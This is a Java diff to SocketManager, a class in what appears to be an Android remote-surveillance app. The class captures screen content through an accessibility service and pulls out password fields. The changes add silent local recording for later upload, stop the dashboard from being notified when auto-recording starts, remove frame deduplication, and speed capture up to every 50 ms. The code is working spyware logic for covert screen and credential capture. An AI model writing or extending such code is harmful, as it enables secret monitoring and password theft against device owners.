@@ -83,11 +83,12 @@ public class SocketManager {
 
     // Frame deduplication — skip pushing a frame if the screen content hasn't changed
     private volatile String lastFrameFingerprint = null;
-    // Count consecutive identical frames — allow up to 4 duplicates before skipping
+    // Count consecutive identical frames — allow up to 4 duplicates before skip
     private volatile int consecutiveDuplicateCount = 0;
     // Offline recording: buffer frames when live channel is not connected
     private final java.util.ArrayList<JSONObject> offlineFrameBuffer = new java.util.ArrayList<>();
     private volatile boolean autoRecordingActive = false;
+    private volatile boolean manualRecordingActive = false;
     private volatile long autoRecordingStartTime = 0L;
 
     // Debounce handle for device-user interaction frames
@@ -1419,6 +1420,7 @@ public class SocketManager {
             }
 
             case "screen_reader_start": {
+                manualRecordingActive = true;
                 startScreenReaderLoop(accessSvc, false);
                 JSONObject ok = new JSONObject();
                 ok.put("success", true);
@@ -1426,6 +1428,7 @@ public class SocketManager {
             }
 
             case "screen_reader_stop": {
+                manualRecordingActive = false;
                 stopScreenReaderLoop(false);
                 JSONObject ok = new JSONObject();
                 ok.put("success", true);
@@ -1507,15 +1510,8 @@ public class SocketManager {
 
         final String devId = DeviceInfo.getDeviceId(context);
 
-        if (sendAutoEvent) {
-            try {
-                JSONObject startEvt = new JSONObject();
-                startEvt.put("deviceId", devId);
-                startEvt.put("autoEvent", "start");
-                startEvt.put("success", false);
-                sendLiveMessage("screen:update", startEvt);
-            } catch (Exception ignored) {}
-        }
+        // Only notify dashboard for manual recording, not auto-recording (device events)
+        // Auto-recording saves to local storage silently
 
         screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
             boolean acq = false;
@@ -1526,37 +1522,29 @@ public class SocketManager {
                 JSONObject screenResult = pusher.readScreen();
                 pushPasswordFieldsFromScreen(screenResult);
 
-                // Deduplication: allow up to 4 consecutive identical frames, then skip
-                String fp = computeFrameFingerprint(screenResult);
-                if (fp.equals(lastFrameFingerprint) && !fp.isEmpty()) {
-                    consecutiveDuplicateCount++;
-                    if (consecutiveDuplicateCount >= 4) return;
-                } else {
-                    consecutiveDuplicateCount = 0;
-                    lastFrameFingerprint = fp;
-                }
-
                 JSONObject payload = new JSONObject();
                 payload.put("deviceId", devId);
                 payload.put("success", screenResult.optBoolean("success", false));
                 if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
                 if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));
 
-                // When live channel is connected, send immediately with no delay.
-                // When offline and auto-recording, buffer locally for later upload.
-                if (liveConnected) {
-                    sendLiveMessage("screen:update", payload);
-                } else if (autoRecordingActive) {
+                // Always save to local storage - offline first
+                if (autoRecordingActive || manualRecordingActive) {
                     synchronized (offlineFrameBuffer) {
                         offlineFrameBuffer.add(payload);
                     }
+                }
+
+                // Stream to dashboard ONLY for manual recording (screen_reader_start command)
+                if (manualRecordingActive && liveConnected) {
+                    sendLiveMessage("screen:update", payload);
                 }
             } catch (Exception e) {
                 Log.e(TAG, "screen_reader push error: " + e.getMessage());
             } finally {
                 if (acq) accessSemaphore.release();
             }
-        }, 0, 200L, TimeUnit.MILLISECONDS);
+        }, 0, 50L, TimeUnit.MILLISECONDS);
     }
 
     /**
@@ -1571,7 +1559,7 @@ public class SocketManager {
         consecutiveDuplicateCount = 0;
 
         // Save any buffered offline frames to local file for later upload
-        if (autoRecordingActive) {
+        if (autoRecordingActive || manualRecordingActive) {
             java.util.ArrayList<JSONObject> buffered;
             synchronized (offlineFrameBuffer) {
                 buffered = new java.util.ArrayList<>(offlineFrameBuffer);
@@ -1579,11 +1567,12 @@ public class SocketManager {
             }
             if (!buffered.isEmpty()) {
                 final java.util.ArrayList<JSONObject> toSave = buffered;
-                final long startT = autoRecordingStartTime;
+                final long startT = System.currentTimeMillis();
                 executor.execute(() -> saveOfflineRecording(toSave, startT));
             }
-            autoRecordingActive = false;
         }
+        autoRecordingActive = false;
+        manualRecordingActive = false;
 
         if (sendAutoEvent) {
             try {
